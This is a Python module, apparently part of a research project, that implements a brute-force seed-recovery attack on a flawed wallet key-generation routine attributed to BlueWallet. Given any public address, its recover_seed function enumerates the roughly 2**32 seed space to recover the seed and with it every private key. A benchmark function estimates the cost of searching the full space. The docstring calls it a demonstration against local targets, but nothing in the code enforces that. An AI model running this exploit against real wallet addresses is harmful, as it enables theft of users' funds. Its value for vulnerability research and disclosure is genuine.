"""Offline seed-recovery attack against the BlueWallet ISAAC CREATE space.

Because a vulnerable CREATE is a deterministic function of a single ~32-bit
ISAAC seed, an attacker who knows *any* address a wallet produced can recover
its seed (and therefore every private key) by enumerating candidate seeds and
comparing derived addresses. This module implements that enumeration and a
throughput benchmark used to extrapolate the full ``2**32`` cost.

Scope: this operates purely on locally generated targets. It is a mechanism
demonstration against public historical source, not a tool for locating or
sweeping funds of real users.
"""

from __future__ import annotations

import time
from dataclasses import dataclass, field
from typing import Callable, Dict, Iterable, Optional, Set

from . import bitcoin
from .create import (
    create_hd_wallet,
    create_singlekey_wallet,
)

# Address "kinds" an attacker might grind against. See docs/EXPLOIT.md §UI map.
KIND_BIP49 = "bip49"                # HD default UI path ("hello there")
KIND_SEGWIT_P2SH = "segwit_p2sh"    # single-key nested SegWit ("oh hai!")
KIND_LEGACY = "legacy"              # single-key P2PKH ("oh hai!")


def addresses_for_seed(
    seed: int,
    kinds: Iterable[str] = (KIND_BIP49, KIND_SEGWIT_P2SH),
    gaps: int = 1,
) -> Dict[str, str]:
    """Derive the candidate addresses a seed would produce, keyed ``kind:index``.

    ``gaps`` controls how many BIP49 external receive indices are derived
    (``m/49'/0'/0'/0/i`` for ``i in range(gaps)``); real wallets may have
    received on ``i > 0``.
    """
    out: Dict[str, str] = {}
    kinds = set(kinds)

    if KIND_BIP49 in kinds:
        hd = create_hd_wallet(seed)
        for i in range(max(1, gaps)):
            out[f"{KIND_BIP49}:{i}"] = hd.bip49_address(i)

    if KIND_SEGWIT_P2SH in kinds or KIND_LEGACY in kinds:
        sk = create_singlekey_wallet(seed)
        if KIND_SEGWIT_P2SH in kinds:
            out[f"{KIND_SEGWIT_P2SH}:0"] = sk.segwit_p2sh_address()
        if KIND_LEGACY in kinds:
            out[f"{KIND_LEGACY}:0"] = sk.legacy_address()

    return out


@dataclass
class RecoveryResult:
    found: bool
    seed: Optional[int] = None
    matched_address: Optional[str] = None
    matched_kind: Optional[str] = None
    scanned: int = 0
    seconds: float = 0.0

    @property
    def rate(self) -> float:
        return self.scanned / self.seconds if self.seconds else 0.0


def recover_seed(
    targets: Set[str],
    start: int = 0,
    end: int = 1 << 32,
    kinds: Iterable[str] = (KIND_BIP49, KIND_SEGWIT_P2SH),
    gaps: int = 1,
    progress_cb: Optional[Callable[[int, float], None]] = None,
    progress_every: int = 20000,
) -> RecoveryResult:
    """Enumerate seeds in ``[start, end)`` until one produces a target address.

    The attacker needs no secret knowledge: only the public target address(es)
    and the (public) CREATE algorithm.
    """
    kinds = tuple(kinds)
    t0 = time.perf_counter()
    scanned = 0
    for seed in range(start, end):
        derived = addresses_for_seed(seed, kinds=kinds, gaps=gaps)
        scanned += 1
        for label, addr in derived.items():
            if addr in targets:
                return RecoveryResult(
                    found=True,
                    seed=seed,
                    matched_address=addr,
                    matched_kind=label,
                    scanned=scanned,
                    seconds=time.perf_counter() - t0,
                )
        if progress_cb and scanned % progress_every == 0:
            progress_cb(seed, time.perf_counter() - t0)
    return RecoveryResult(found=False, scanned=scanned, seconds=time.perf_counter() - t0)


@dataclass
class Benchmark:
    kind: str
    seeds: int
    seconds: float
    used_coincurve: bool = field(default=False)

    @property
    def rate(self) -> float:
        return self.seeds / self.seconds if self.seconds else 0.0

    def full_space_seconds(self, space: int = 1 << 32) -> float:
        return space / self.rate if self.rate else float("inf")


def benchmark(kind: str = KIND_SEGWIT_P2SH, seeds: int = 5000, start: int = 0, gaps: int = 1) -> Benchmark:
    """Measure single-thread throughput for one address kind."""
    kinds = (kind,)
    t0 = time.perf_counter()
    for seed in range(start, start + seeds):
        addresses_for_seed(seed, kinds=kinds, gaps=gaps)
    elapsed = time.perf_counter() - t0
    return Benchmark(kind=kind, seeds=seeds, seconds=elapsed, used_coincurve=bitcoin._HAVE_COINCURVE)


def format_duration(seconds: float) -> str:
    if seconds == float("inf"):
        return "infinite"
    units = [("y", 365 * 24 * 3600), ("d", 24 * 3600), ("h", 3600), ("m", 60), ("s", 1)]
    parts = []
    for name, size in units:
        if seconds >= size or (name == "s" and not parts):
            value = int(seconds // size)
            seconds -= value * size
            if value:
                parts.append(f"{value}{name}")
        if len(parts) == 2:
            break
    return " ".join(parts) if parts else "0s"
